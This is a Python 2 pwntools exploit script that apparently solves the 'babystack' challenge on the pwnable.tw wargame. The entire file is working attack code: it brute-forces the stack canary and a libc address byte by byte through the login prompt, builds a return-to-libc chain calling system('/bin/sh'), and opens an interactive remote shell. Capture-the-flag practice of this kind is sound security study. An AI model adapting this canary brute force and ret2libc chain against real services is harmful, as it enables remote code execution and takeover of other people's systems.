#!/usr/bin/env python2
from pwn import *

exe = ELF("./babystack")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = "kitty sh -c".split()
context.log_level = "debug"
IP, PORT = "chall.pwnable.tw", 10205

global io
breakpoints = '''
break open
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(IP, PORT)
elif len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

system = libc.symbols['__libc_system']
bin_sh = 0x18c177
pop_rdi = 0x21102

def logout(cnt=1):
    reu(">> ")
    s("1"*cnt)


def login(password,nl="\n"):
    logout()
    reu(" :")
    s(password+nl)


def copy(copy):
    reu(">> ")
    s("3")
    reu(" :")
    s(copy)


def ext():
    reu(">> ")
    s("2")


def leak_canary():
    leak = ["\x00"]*16
    for i in range(16):
        for j in range(1, 256):
            leak[i] = chr(j)
            login("".join(leak))
            if b"Login" in reu(" !"):
                logout()
                break
    return "".join(leak)

def leak_libc():
    leak = ["A"]*8 + ["\x00"]*6
    for i in range(6):
        for j in range(1,256):
            leak[8+i] = chr(j)
            login("".join(leak))
            if b"Login" in reu(" !"):
                logout()
                break
    if leak[13] != "\x7f":
        log.error("Libc leak failed!")
        exit(0)
    return "".join(leak[8:])

def send_payload(pyld):
    i = 0
    pyld = ("\x00" + "A"*63 + can_txt + "A"*24 + pyld)[:127]
    while i != -1:
        pyld = list(pyld)
        pyld[i] = "\x00"
        login("".join(pyld),"")
        copy("A"*63)
        logout()
        pyld = "".join(pyld)
        i = pyld.rfind("f")
    

canary = leak_canary()
can_txt = canary
canary = unpack(canary,128)
log.info("Canary Leak -> "+str(hex(canary)))

passwd = "\x00" + "A"*71
login(passwd,"")
copy("A"*63)
logout()

setvbuf9 = unpack(leak_libc(),48)
libc_base = setvbuf9-0x78439
log.info("Libc Base ->"+str(hex(libc_base)))

payload = p64(libc_base+pop_rdi)
payload += p64(libc_base+bin_sh)
payload += p64(system)

payload = payload.replace("\x00","f")

send_payload(payload)
login("\x00")
ext()

io.interactive()